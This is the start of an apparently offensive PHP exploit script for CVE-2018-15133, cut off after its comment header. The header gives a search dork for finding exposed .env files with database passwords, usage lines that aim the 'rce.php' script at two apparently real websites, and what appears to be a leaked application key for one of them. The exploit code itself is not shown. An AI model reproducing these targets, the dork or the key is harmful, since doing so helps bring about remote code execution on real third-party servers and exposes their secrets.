#!/usr/bin/env php CVE-2018-15133
<?php
/**
 * search gg: db_password filetype:env
 * php rce.php url=smartbeachphuket.com
 * php rce.php url=tuixachnamnu.vn key=base64:YhTFPyIazlFTZ7bX4wkXwTamds6Qz3LPMPm3C0H1yu4=
